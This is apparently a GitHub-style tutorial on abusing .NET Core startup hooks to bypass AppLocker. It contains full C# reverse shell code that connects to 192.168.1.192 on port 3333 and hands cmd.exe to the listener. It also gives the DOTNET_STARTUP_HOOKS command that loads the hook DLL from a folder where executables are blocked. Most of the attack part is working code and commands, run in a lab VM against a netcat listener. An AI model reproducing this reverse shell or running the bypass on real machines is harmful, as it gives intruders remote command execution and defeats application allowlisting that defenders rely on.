
# DLL Injection/Manipulation via .NET Core Startup Hooks

Starting from .Net Core 3.x, even .Net 5 and .Net 6, microsoft allows us to specify Startup procedures before our `Main` function runs. 

> This would allow hosting providers to define custom configuration and policy in managed code, including settings that potentially influence load behavior of the main entry point such as the AssemblyLoadContext behavior. The hook could be used to set up tracing or telemetry injection, to set up callbacks for handling Debug.Assert (if we make such an API available), or other environment-dependent behavior. The hook is separate from the entry point, so that user code doesn't need to be modified.

More info regarding Startup Hooks can be seen [here](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md).


In this demo, we will focus on
1. Bypassing Applocker
2. Introspection and Modification of code or behaviour at Runtime


# How to define a Startup Hook

A `Startup Hook` has to have 
1. No Namespaces
2. Class name is `StartupHook`
3. Implement the static method `public static void Initialize()`.

Basically, the `StartupHook` skeleton looks as follows.

```cs
internal class StartupHook
{
    public static void Initialize()
    {
        //Attacker code goes here
    }
}
```

Then, we will have to compile it as a `Class Library` file.

Following that, create an environment variable `set DOTNET_STARTUP_HOOKS=<Full Path to Hook>` and proceed to run your binary.

# Bypassing Applocker

For this demo, I have a `Win10 VM` with `Applocker` enabled with the default rules. In addition, the Applocker has a rule that allows a particular folder to run executables.

> Do remember to run the `gpupdate /Force` command if you have added a new applocker rule, for the new rule to take effect.


![image](https://user-images.githubusercontent.com/12537739/149788090-404edd1b-272b-41ae-86b4-d8d99fb489a6.png)

As we can see, running the executable from the `Desktop` directory is blocked by Applocker.

![image](https://user-images.githubusercontent.com/12537739/149789288-fc19d934-0c97-477c-b4ae-93ccbacda21c.png)

Running it from the `Allowed` folder gives us a console windows that simply prints `Hello World!`

![image](https://user-images.githubusercontent.com/12537739/149793011-975cccde-3165-44bd-9733-f2c394d92790.png)


Now lets prepare our `Startup Hook`!

We are going to create a reverse shell to connect to the host machine at `192.168.1.192`.

```cs
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

internal class StartupHook
{


    public static void Initialize()
    {

        StartReverseShell();
    }

    private static void StartReverseShell()
    {
        int delay = 3000;
        string ip = "192.168.1.192";
        int port = 3333;
        var debugMessage = $"Connecting to {ip}:{port} in {delay / 1000} seconds...";
        Console.WriteLine(debugMessage);

        try
        {
            using (TcpClient client = new TcpClient(ip, port))
            {

                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process process = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                RedirectStandardInput = true
                            },

                        };
                        process.OutputDataReceived += new DataReceivedEventHandler(OutputDataReceivedHandler);
                        process.Start();
                        process.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            process.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);

        }

    }
  private static void OutputDataReceivedHandler(object sendingProcess, DataReceivedEventArgs outLine)
  {
    StringBuilder strOutput = new StringBuilder();

    if (!String.IsNullOrEmpty(outLine.Data))
    {
        try
        {
            strOutput.Append(outLine.Data);
            streamWriter.WriteLine(strOutput);
            streamWriter.Flush();
        }
        catch (Exception err) { }
    }
  }
}



```

Basically inside our `Initialize` static method, we are calling our `StartReverseShell` method.

The full code example can also be retrieved in this repo under the `Startup Hook` project.

Proceed to compile the project as a `Class Library` and we will end up with a `Hook.dll`.

![image](https://user-images.githubusercontent.com/12537739/149790561-2f211a86-efd2-44ff-8422-39fbe7df70d1.png)

Let's copy our `Hook.dll` into the `VM`'s `Desktop` folder. 

> Remember, the `Desktop` folder is restricted to NOT execute any executables. But it doesn't matter as we can bypass it using this hooking method.

Now let's start a `netcat` session in our host and listen to port `3333` which is configured in our `hook.dll` to connect to.

![image](https://user-images.githubusercontent.com/12537739/149791028-904b0dd4-15f7-4b88-a5a6-0752e6f00dfb.png)

Next in our `VM`, lets run the following command to set our environment variable to set our `Startup Hook`.

```sh
C:\Users\NormalUser\Desktop\Allowed> set DOTNET_STARTUP_HOOKS=C:\Users\NormalUser\Desktop\Hook.dll
```

Lastly we simply run our program.

![image](https://user-images.githubusercontent.com/12537739/149791735-a71e8da5-1e0d-4872-95c1-d3fc7a5950b3.png)


![image](https://user-images.githubusercontent.com/12537739/149791799-e986a456-e699-4175-bb87-e00c34601f2f.png)


We have just bypassed Applocker!
